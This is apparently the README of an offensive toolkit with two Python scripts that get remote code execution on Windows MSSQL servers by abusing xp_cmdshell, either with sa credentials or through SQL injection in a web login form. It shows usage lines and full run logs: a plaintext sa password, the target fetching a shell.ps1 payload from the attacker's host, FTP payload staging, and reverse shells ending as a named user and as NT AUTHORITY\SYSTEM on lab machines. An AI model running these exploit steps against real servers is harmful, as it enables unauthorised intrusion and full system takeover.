# mssql_xpcmdshell_rce

## Summary

Gets code execution on windows server through mssql 'xp_cmdshell'.

## Usage

Run ./mssql_xpcmdshell_rce to get the usage menu.

```sh
./mssql_xpcmdshell_rce.py

• ▌ ▄ ·. .▄▄ · .▄▄ · .▄▄▄  ▄▄▌  ▐▄• ▄  ▄▄▄· ▄▄· • ▌ ▄ ·. ·▄▄▄▄  .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▐█ ▀. ▐█ ▀. ▐▀•▀█ ██•   █▌█▌▪▐█ ▄█▐█ ▌▪·██ ▐███▪██▪ ██ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█·▄▀▀▀█▄▄▀▀▀█▄█▌·.█▌██▪   ·██·  ██▀·██ ▄▄▐█ ▌▐▌▐█·▐█· ▐█▌▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▪▄█·▐█▌▐▌▪▐█·█▌▐█▪·•▐███▌██ ██▌▐█▌██. ██ ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀▀▀▀  ▀▀▀▀ ·▀▀█. .▀▀▀ •▀▀ ▀▀.▀   ·▀▀▀ ▀▀  █▪▀▀▀▀▀▀▀▀•  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀  ▀·▀▀▀  ▀▀▀

Usage: ./mssql_xpcmdshell_rce.py <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./mssql_xpcmdshell_rce.py 10.10.10.59 10.10.14.24 1337 <USERNAME> <PASSWORD>
```        

Run the exploit.

```sh
mssql_xpcmdshell_rce  master ⦿ ./mssql_xpcmdshell_rce.py 10.10.10.59 10.10.14.24 1337 'sa' 'GWE3V65#6KFH93@4GWTG2G'
[+] LHOST = 10.10.14.24
[+] Netcat = 1337
[+] HTTP Listen = 8000
[+] Successful login at mssql server 10.10.10.59 with username sa and password GWE3V65#6KFH93@4GWTG2G
[+] Enabling 'xp_cmdshell'
10.10.10.59 - - [17/Jul/2018 11:57:27] "GET /shell.ps1 HTTP/1.1" 200 -
Connection from 10.10.10.59:58861
Windows PowerShell running as user Sarah on TALLY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```


# mssql_xpcmdshell_rce_sqli.py

## Summary

If the database connection is using the sa account in mssql and a sql injection is available.
You can execute a shell by abuse xp_cmdshell. This code executes xp_cmdshell true an SQL injection.

After url you need to type www-form-urlencoded parameters these can be found from burp specify ^INJECT^ where the SQL injection
is found to run this script. Here is an example

## Prerequisite

Note as payload is copied over ftp you need to run the exploit as root so ftp server can bind to port 21
or use the "setcap cap_net_bind_service=+ep" capability.

## Usage

```sh
⬢  mssql_xpcmdshell_rce  master ⦿ ./mssql_xpcmdshell_sqli.py

• ▌ ▄ ·. .▄▄ · .▄▄ · .▄▄▄  ▄▄▌  ▐▄• ▄  ▄▄▄· ▄▄· • ▌ ▄ ·. ·▄▄▄▄  .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▐█ ▀. ▐█ ▀. ▐▀•▀█ ██•   █▌█▌▪▐█ ▄█▐█ ▌▪·██ ▐███▪██▪ ██ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█·▄▀▀▀█▄▄▀▀▀█▄█▌·.█▌██▪   ·██·  ██▀·██ ▄▄▐█ ▌▐▌▐█·▐█· ▐█▌▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▪▄█·▐█▌▐▌▪▐█·█▌▐█▪·•▐███▌██ ██▌▐█▌██. ██ ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀▀▀▀  ▀▀▀▀ ·▀▀█. .▀▀▀ •▀▀ ▀▀.▀   ·▀▀▀ ▀▀  █▪▀▀▀▀▀▀▀▀•  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀  ▀·▀▀▀  ▀▀▀ 
[mssql pop shell with xp_cmdshell in sql injection.]
    
Usage: ./mssql_xpcmdshell_sqli.py <URL|[txtLoginID=sa&txtPassword=password^INJECT^&cmdSubmit=Login]> <LHOST> <LPORT>

EXAMPLE: ./mssql_xpcmdshell_sqli.py http://10.10.10.59/login-off.asp[txtLoginID=sa&txtPassword=password^INJECT^&cmdSubmit=Login] 10.10.14.24 1337
```

Run the exploit

```sh
⬢  mssql_xpcmdshell_rce  master ⦿ sudo ./mssql_xpcmdshell_sqli.py "http://10.11.1.xxx/login-off.asp[txtLoginID=sa&txtPassword=password^INJECT^&cmdSubmit=Login]" 10.11.0.xxx 4444
[sudo] password for nighter:                                                                                                                                                        
[+] LHOST = 10.11.0.xxx                                                                                                 
[+] Netcat = 4444                                                                                                                                                                   
[I 2019-02-09 17:34:41] >>> starting FTP server on 0.0.0.0:21, pid=26797 <<<               
[I 2019-02-09 17:34:41] concurrency model: async                                                                                                                                    
[I 2019-02-09 17:34:41] masquerade (NAT) address: None                                     
[I 2019-02-09 17:34:41] passive ports: None                                                                                                                                         
<html><title>Offensive ASP Test Page</title><br><br><center><h1>ACCESS DENIED</h1></center>
        <meta http-equiv="REFRESH"content="2;url=/base-login.asp">                                                                                                                  
<html><title>Offensive ASP Test Page</title><br><br><center><h1>ACCESS DENIED</h1></center>
        <meta http-equiv="REFRESH"content="2;url=/base-login.asp">                                                                                                                  
<html><title>Offensive ASP Test Page</title><br><br><center><h1>ACCESS DENIED</h1></center>
        <meta http-equiv="REFRESH"content="2;url=/base-login.asp">                                                                                                                  
<html><title>Offensive ASP Test Page</title><br><br><center><h1>ACCESS DENIED</h1></center>
        <meta http-equiv="REFRESH"content="2;url=/base-login.asp">                                                                                                                  
<html><title>Offensive ASP Test Page</title><br><br><center><h1>ACCESS DENIED</h1></center>
        <meta http-equiv="REFRESH"content="2;url=/base-login.asp">                                                                                                
[I 2019-02-09 17:34:43] 10.11.1.xxx:1193-[] FTP session opened (connect)    
[I 2019-02-09 17:34:43] 10.11.1.xxx:1193-[anonymous] USER 'anonymous' logged in.                         
[I 2019-02-09 17:34:43] 10.11.1.xxx:1193-[] Previous account information was flushed, send password.                               
[I 2019-02-09 17:34:44] 10.11.1.xxx:1193-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:44] 10.11.1.xxx:1193-[anonymous] FTP session closed (disconnect).
[I 2019-02-09 17:34:44] 10.11.1.xxx:1194-[] FTP session opened (connect)
[I 2019-02-09 17:34:44] 10.11.1.xxx:1194-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:44] 10.11.1.xxx:1194-[] Previous account information was flushed, send password.
[I 2019-02-09 17:34:45] 10.11.1.xxx:1194-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:45] 10.11.1.xxx:1194-[anonymous] FTP session closed (disconnect).
[I 2019-02-09 17:34:45] 10.11.1.xxx:1195-[] FTP session opened (connect)
[I 2019-02-09 17:34:45] 10.11.1.xxx:1195-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:46] 10.11.1.xxx:1195-[] Previous account information was flushed, send password.
[I 2019-02-09 17:34:46] 10.11.1.xxx:1195-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:46] 10.11.1.xxx:1195-[anonymous] FTP session closed (disconnect).
[I 2019-02-09 17:34:46] 10.11.1.xxx:1196-[] FTP session opened (connect)
[I 2019-02-09 17:34:47] 10.11.1.xxx:1196-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:47] 10.11.1.xxx:1196-[] Previous account information was flushed, send password.
[I 2019-02-09 17:34:47] 10.11.1.xxx:1196-[anonymous] USER 'anonymous' logged in.
[I 2019-02-09 17:34:47] 10.11.1.xxx:1196-[anonymous] FTP session closed (disconnect).
<html><title>Offensive ASP Test Page</title><br><br><center><h1>ACCESS DENIED</h1></center>
        <meta http-equiv="REFRESH"content="2;url=/base-login.asp">
Connection from 10.11.1.xxx:1197
Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\WINNT\system32>whoami                                                             
NT AUTHORITY\SYSTEM    
```